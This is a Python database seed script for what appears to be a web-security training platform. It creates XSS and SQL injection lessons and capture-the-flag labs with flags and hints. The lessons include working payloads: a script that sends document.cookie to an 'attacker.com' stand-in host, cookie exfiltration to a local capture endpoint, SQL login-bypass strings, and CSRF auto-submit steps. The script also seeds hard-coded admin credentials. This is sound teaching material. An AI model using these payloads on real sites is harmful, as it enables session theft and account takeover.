"""
WebNoX - Database Seed Script
Seeds the database with topics, courses, lessons, and labs
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import create_app, db
from app.models.user import User
from app.models.course import Course, Lesson
from app.models.lab import Lab
from app.models.topic import Topic
import json

def seed_database():
    app = create_app()
    
    with app.app_context():
        print("🌱 Starting database seed...")
        
        # Create tables
        db.create_all()
        
        # Check if data already exists
        if User.query.first():
            print("⚠️  Database already has data. Skipping seed.")
            return
        
        # Create admin user
        print("👤 Creating admin user...")
        admin = User(
            username='admin',
            email='admin@webnox.local',
            role='admin'
        )
        admin.set_password('admin123')
        db.session.add(admin)
        
        # Create test user
        test_user = User(
            username='student',
            email='student@webnox.local',
            role='student'
        )
        test_user.set_password('student123')
        db.session.add(test_user)
        
        # Create Security Topics
        print("🏷️  Creating security topics...")
        topics_data = [
            {
                'name': 'Cross-Site Scripting (XSS)',
                'slug': 'xss',
                'description': 'XSS attacks enable attackers to inject malicious scripts into web pages viewed by other users. Learn about reflected, stored, and DOM-based XSS vulnerabilities.',
                'icon': 'code',
                'color': '#e74c3c',
                'severity': 'high',
                'owasp_category': 'A03:2021 - Injection',
                'order': 1
            },
            {
                'name': 'SQL Injection',
                'slug': 'sqli',
                'description': 'SQL injection attacks exploit vulnerabilities in database queries. Learn to identify, exploit, and prevent SQL injection in web applications.',
                'icon': 'database',
                'color': '#9b59b6',
                'severity': 'critical',
                'owasp_category': 'A03:2021 - Injection',
                'order': 2
            },
            {
                'name': 'Cross-Site Request Forgery (CSRF)',
                'slug': 'csrf',
                'description': 'CSRF attacks trick users into performing unwanted actions on authenticated websites. Learn how to exploit and defend against CSRF vulnerabilities.',
                'icon': 'exchange-alt',
                'color': '#f39c12',
                'severity': 'medium',
                'owasp_category': 'A01:2021 - Broken Access Control',
                'order': 3
            },
            {
                'name': 'Insecure Direct Object Reference (IDOR)',
                'slug': 'idor',
                'description': 'IDOR vulnerabilities occur when applications expose internal object references. Learn to find and exploit access control flaws.',
                'icon': 'key',
                'color': '#3498db',
                'severity': 'high',
                'owasp_category': 'A01:2021 - Broken Access Control',
                'order': 4
            },
            {
                'name': 'Authentication Bypass',
                'slug': 'auth-bypass',
                'description': 'Authentication vulnerabilities allow attackers to bypass login mechanisms. Learn about weak passwords, session hijacking, and authentication flaws.',
                'icon': 'unlock-alt',
                'color': '#1abc9c',
                'severity': 'critical',
                'owasp_category': 'A07:2021 - Identification and Authentication Failures',
                'order': 5
            },
            {
                'name': 'Server-Side Request Forgery (SSRF)',
                'slug': 'ssrf',
                'description': 'SSRF attacks trick servers into making requests to unintended locations. Learn to exploit internal services and cloud metadata endpoints.',
                'icon': 'server',
                'color': '#e67e22',
                'severity': 'high',
                'owasp_category': 'A10:2021 - Server-Side Request Forgery',
                'order': 6
            },
            {
                'name': 'File Upload Vulnerabilities',
                'slug': 'file-upload',
                'description': 'Insecure file upload functionality can lead to remote code execution. Learn to bypass upload restrictions and exploit file handling flaws.',
                'icon': 'file-upload',
                'color': '#2ecc71',
                'severity': 'critical',
                'owasp_category': 'A04:2021 - Insecure Design',
                'order': 7
            },
            {
                'name': 'XML External Entity (XXE)',
                'slug': 'xxe',
                'description': 'XXE attacks exploit XML parsers to access files, perform SSRF, or execute denial of service attacks. Learn XML injection techniques.',
                'icon': 'file-code',
                'color': '#8e44ad',
                'severity': 'high',
                'owasp_category': 'A05:2021 - Security Misconfiguration',
                'order': 8
            }
        ]
        
        topics = {}
        for topic_data in topics_data:
            topic = Topic(**topic_data)
            db.session.add(topic)
            topics[topic_data['slug']] = topic
        
        db.session.flush()
        
        # Create XSS Course
        print("📚 Creating courses...")
        xss_course = Course(
            topic_id=topics['xss'].id,
            title='Cross-Site Scripting (XSS) Fundamentals',
            slug='xss-fundamentals',
            description='Learn about Cross-Site Scripting vulnerabilities, from basic concepts to advanced exploitation techniques. Understand how attackers inject malicious scripts and how to defend against them.',
            difficulty='beginner',
            category='XSS',
            duration_minutes=120,
            points=150,
            order=1,
            is_published=True
        )
        db.session.add(xss_course)
        db.session.flush()
        
        # XSS Lessons
        xss_lessons = [
            {
                'title': 'Introduction to XSS',
                'slug': 'introduction',
                'order': 1,
                'duration_minutes': 15,
                'content': '''
<h2>What is Cross-Site Scripting (XSS)?</h2>
<p>Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.</p>

<h3>How XSS Works</h3>
<p>An XSS vulnerability occurs when a web application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute scripts in the victim's browser, which can:</p>
<ul>
    <li>Steal session cookies and authentication tokens</li>
    <li>Redirect users to malicious websites</li>
    <li>Modify the content of the web page</li>
    <li>Capture keystrokes and form data</li>
</ul>

<h3>Types of XSS</h3>
<p>There are three main types of XSS attacks:</p>
<ol>
    <li><strong>Reflected XSS</strong> - The malicious script comes from the current HTTP request</li>
    <li><strong>Stored XSS</strong> - The malicious script is stored on the target server</li>
    <li><strong>DOM-based XSS</strong> - The vulnerability exists in client-side code rather than server-side</li>
</ol>

<div class="alert alert-info">
    <strong>💡 Key Takeaway:</strong> XSS is one of the most common web vulnerabilities and is listed in the OWASP Top 10.
</div>
'''
            },
            {
                'title': 'Reflected XSS',
                'slug': 'reflected-xss',
                'order': 2,
                'duration_minutes': 20,
                'content': '''
<h2>Reflected XSS Attacks</h2>
<p>Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.</p>

<h3>Example Vulnerable Code</h3>
<pre><code class="language-php">&lt;?php
// Vulnerable PHP code
echo "Hello, " . $_GET['name'];
?&gt;</code></pre>

<h3>Attack Example</h3>
<p>An attacker could craft a malicious URL:</p>
<pre><code>https://vulnerable-site.com/greet?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>

<h3>Impact</h3>
<p>When a victim clicks the link, the script executes in their browser context, potentially allowing the attacker to:</p>
<ul>
    <li>Steal cookies: <code>document.cookie</code></li>
    <li>Capture credentials</li>
    <li>Perform actions on behalf of the user</li>
</ul>

<h3>Prevention</h3>
<p>Always encode user input before reflecting it:</p>
<pre><code class="language-php">&lt;?php
// Secure PHP code
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?&gt;</code></pre>
'''
            },
            {
                'title': 'Stored XSS',
                'slug': 'stored-xss',
                'order': 3,
                'duration_minutes': 20,
                'content': '''
<h2>Stored XSS Attacks</h2>
<p>Stored XSS (also known as Persistent XSS) occurs when an application stores user-supplied data and later includes it in responses without proper encoding.</p>

<h3>Common Locations</h3>
<ul>
    <li>Comment sections and forums</li>
    <li>User profile fields</li>
    <li>Product reviews</li>
    <li>Chat messages</li>
</ul>

<h3>Why It's More Dangerous</h3>
<p>Stored XSS is generally more severe than reflected XSS because:</p>
<ul>
    <li>The payload is stored permanently</li>
    <li>Every user who views the page is affected</li>
    <li>No special link is required for exploitation</li>
</ul>

<h3>Example Attack Scenario</h3>
<p>1. Attacker posts a comment containing malicious script:</p>
<pre><code>&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></pre>

<p>2. The comment is stored in the database</p>
<p>3. Every user viewing that page executes the script</p>

<div class="alert alert-danger">
    <strong>⚠️ Warning:</strong> Stored XSS can lead to account takeover, data theft, and malware distribution.
</div>
'''
            }
        ]
        
        for lesson_data in xss_lessons:
            lesson = Lesson(
                course_id=xss_course.id,
                **lesson_data
            )
            db.session.add(lesson)
        
        # Create SQL Injection Course
        sqli_course = Course(
            topic_id=topics['sqli'].id,
            title='SQL Injection Attacks',
            slug='sql-injection',
            description='Master SQL Injection techniques and learn how to identify, exploit, and prevent database vulnerabilities in web applications.',
            difficulty='intermediate',
            category='SQL Injection',
            duration_minutes=180,
            points=200,
            order=2,
            is_published=True
        )
        db.session.add(sqli_course)
        db.session.flush()
        
        # SQLi Lessons
        sqli_lessons = [
            {
                'title': 'Introduction to SQL Injection',
                'slug': 'introduction',
                'order': 1,
                'duration_minutes': 20,
                'content': '''
<h2>What is SQL Injection?</h2>
<p>SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in applications that construct SQL queries using user input.</p>

<h3>How It Works</h3>
<p>When an application builds SQL queries by concatenating user input, an attacker can modify the query's logic:</p>
<pre><code class="language-sql">-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Attacker input: admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = ''</code></pre>

<h3>Types of SQL Injection</h3>
<ul>
    <li><strong>In-band SQLi</strong> - Results are returned directly in the response</li>
    <li><strong>Blind SQLi</strong> - No visible output, infer data through behavior</li>
    <li><strong>Out-of-band SQLi</strong> - Data exfiltration through alternative channels</li>
</ul>
'''
            }
        ]
        
        for lesson_data in sqli_lessons:
            lesson = Lesson(
                course_id=sqli_course.id,
                **lesson_data
            )
            db.session.add(lesson)
        
        # Create Labs
        print("🔬 Creating labs...")
        labs = [
            {
                'title': 'Reflected XSS - Basic',
                'slug': 'xss-reflected-basic',
                'description': 'Your first XSS challenge. Find and exploit a reflected XSS vulnerability to discover the hidden flag.',
                'instructions': '''
<h3>Objective</h3>
<p>Find and exploit a reflected XSS vulnerability in the search functionality to reveal the hidden flag.</p>

<h3>Background</h3>
<p>The target application has a search feature that reflects user input without proper sanitization. Your goal is to inject JavaScript that will reveal the hidden flag stored in the page.</p>

<h3>Steps</h3>
<ol>
    <li>Navigate to the search page</li>
    <li>Test the search field for XSS vulnerabilities</li>
    <li>Craft a payload that executes JavaScript</li>
    <li>Use the DOM to find the hidden flag element</li>
</ol>

<h3>Hints</h3>
<ul>
    <li>Start with a simple <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> payload</li>
    <li>Check the page source to see how your input is reflected</li>
    <li>The flag is stored in a hidden element with id="secret-flag"</li>
</ul>

<div class="alert alert-info">
    <strong>Flag Format:</strong> FLAG{...}
</div>
''',
                'difficulty': 'beginner',
                'category': 'XSS',
                'vulnerability_type': 'Reflected XSS',
                'points': 50,
                'flag': 'FLAG{xss_r3fl3ct3d_b4s1c}',
                'hints': json.dumps([
                    "Try entering HTML tags in the search box",
                    "Look for where your input appears in the page source",
                    "The flag is in a hidden div - use document.getElementById('secret-flag')"
                ]),
                'has_bot': False,
                'order': 1,
                'is_active': True
            },
            {
                'title': 'Stored XSS - Comment Section',
                'slug': 'xss-stored-comments',
                'description': 'Exploit a stored XSS vulnerability in a comment system to steal the admin bot\'s cookies containing the flag.',
                'instructions': '''
<h3>Objective</h3>
<p>Inject a persistent XSS payload into the comment section that steals the admin bot's cookies.</p>

<h3>Scenario</h3>
<p>The blog allows users to post comments that are stored and displayed to all visitors. An <strong>admin bot</strong> visits the page every 30 seconds with cookies containing the flag. Your goal is to steal the admin's cookies!</p>

<h3>Challenge</h3>
<ul>
    <li>Post a comment containing your XSS payload</li>
    <li>The payload should execute when the admin bot visits</li>
    <li>Exfiltrate the admin's cookies to the capture endpoint</li>
    <li>The flag is in the <code>admin_session</code> cookie</li>
</ul>

<h3>Exfiltration Endpoint</h3>
<p>Use the built-in endpoint: <code>/capture?data=STOLEN_DATA</code></p>

<h3>Example Payload</h3>
<pre><code>&lt;script&gt;new Image().src='/capture?data='+document.cookie&lt;/script&gt;</code></pre>
''',
                'difficulty': 'intermediate',
                'category': 'XSS',
                'vulnerability_type': 'Stored XSS',
                'points': 100,
                'flag': 'FLAG{st0r3d_xss_p3rs1st3nt}',
                'hints': json.dumps([
                    "Comments are not sanitized before storage",
                    "The admin bot has cookies - use document.cookie to access them",
                    "Use /capture?data= endpoint to exfiltrate data",
                    "Try: <script>fetch('/capture?data='+document.cookie)</script>"
                ]),
                'has_bot': True,
                'bot_interval': 30,
                'order': 2,
                'is_active': True
            },
            {
                'title': 'SQL Injection - Login Bypass',
                'slug': 'sqli-login-bypass',
                'description': 'Bypass authentication using SQL injection to access the admin panel and find the flag.',
                'instructions': '''
<h3>Objective</h3>
<p>Use SQL injection to bypass the login form and access the admin account.</p>

<h3>Background</h3>
<p>The login form is vulnerable to SQL injection. The application uses a simple query to validate credentials:</p>
<pre><code>SELECT * FROM users WHERE username='$user' AND password='$pass'</code></pre>

<h3>Your Mission</h3>
<ol>
    <li>Analyze the login form behavior</li>
    <li>Craft an SQL injection payload</li>
    <li>Log in as the admin user</li>
    <li>Find the flag in the admin dashboard</li>
</ol>

<h3>Hints</h3>
<ul>
    <li>Try adding a single quote to cause an SQL error</li>
    <li>Use SQL comments (--) to ignore the password check</li>
    <li>Classic payload: <code>admin' --</code></li>
</ul>
''',
                'difficulty': 'beginner',
                'category': 'SQL Injection',
                'vulnerability_type': 'SQL Injection',
                'points': 75,
                'flag': 'FLAG{sql1_l0g1n_byp4ss}',
                'hints': json.dumps([
                    "Try adding a single quote to the username field",
                    "Use -- to comment out the rest of the query",
                    "admin' OR '1'='1 might be useful",
                    "Try: admin' --"
                ]),
                'has_bot': False,
                'order': 3,
                'is_active': True
            },
            {
                'title': 'IDOR - User Profile Access',
                'slug': 'idor-profile',
                'description': 'Exploit an Insecure Direct Object Reference vulnerability to access other users\' private profiles and find the admin\'s secret flag.',
                'instructions': '''
<h3>Objective</h3>
<p>Access the admin's private profile by manipulating the request parameters to find their secret notes containing the flag.</p>

<h3>Scenario</h3>
<p>After logging in, you can view your profile at <code>/profile?id=100</code>. The application doesn't properly verify if you're authorized to view other profiles.</p>

<h3>Challenge</h3>
<ul>
    <li>Log in with the provided guest account (guest / guest)</li>
    <li>Find your profile page and note the URL structure</li>
    <li>Access the admin's profile (user ID 1)</li>
    <li>Retrieve the flag from the admin's private notes</li>
</ul>

<h3>Test Account</h3>
<p>Username: <code>guest</code> | Password: <code>guest</code></p>
''',
                'difficulty': 'beginner',
                'category': 'IDOR',
                'vulnerability_type': 'IDOR',
                'points': 50,
                'flag': 'FLAG{1d0r_pr0f1l3_4cc3ss}',
                'hints': json.dumps([
                    "Change the id parameter in the URL",
                    "Admin is usually the first user (ID=1)",
                    "Try accessing /profile?id=1"
                ]),
                'has_bot': False,
                'order': 4,
                'is_active': True
            },
            {
                'title': 'CSRF - Password Change',
                'slug': 'csrf-password',
                'description': 'Craft a CSRF attack to change a victim\'s password without their knowledge. Exploit the missing CSRF protection.',
                'instructions': '''
<h3>Objective</h3>
<p>Create a malicious page that, when visited by the victim, changes their password without their consent.</p>

<h3>Vulnerability</h3>
<p>The password change form doesn't include CSRF tokens or verify the origin of requests. This allows cross-site request forgery attacks.</p>

<h3>Steps</h3>
<ol>
    <li>Log in as the attacker (attacker / attacker123)</li>
    <li>Analyze the password change request</li>
    <li>Create an HTML page with a hidden form targeting the victim</li>
    <li>Make the form auto-submit using JavaScript</li>
    <li>Simulate the victim visiting your malicious page</li>
</ol>

<h3>Test Accounts</h3>
<p>Victim: <code>victim / victim123</code></p>
<p>Attacker: <code>attacker / attacker123</code></p>
''',
                'difficulty': 'intermediate',
                'category': 'CSRF',
                'vulnerability_type': 'CSRF',
                'points': 100,
                'flag': 'FLAG{csrf_p4ssw0rd_ch4ng3}',
                'hints': json.dumps([
                    "Use a hidden form with method POST",
                    "JavaScript can auto-submit: document.forms[0].submit()",
                    "The endpoint is POST /change-password",
                    "Include new_password and confirm_password fields"
                ]),
                'has_bot': False,
                'order': 5,
                'is_active': True
            }
        ]
        
        # Map labs to topics
        lab_topic_map = {
            'xss-reflected-basic': 'xss',
            'xss-stored-comments': 'xss',
            'sqli-login-bypass': 'sqli',
            'idor-profile': 'idor',
            'csrf-password': 'csrf'
        }
        
        for lab_data in labs:
            # Add topic_id based on the mapping
            topic_slug = lab_topic_map.get(lab_data['slug'])
            if topic_slug and topic_slug in topics:
                lab_data['topic_id'] = topics[topic_slug].id
            
            lab = Lab(**lab_data)
            db.session.add(lab)
        
        # Commit all changes
        db.session.commit()
        print("✅ Database seeded successfully!")
        print("")
        print("📋 Created accounts:")
        print("   Admin: admin@webnox.local / admin123")
        print("   Student: student@webnox.local / student123")
        print("")
        print("🏷️  Topics created: " + ", ".join([t['name'] for t in topics_data]))
        print("📚 Courses created: 2")
        print("🔬 Labs created: 5 (1 with bot)")
        print("")
        print("🚀 Run the app with: python run.py")

if __name__ == '__main__':
    seed_database()
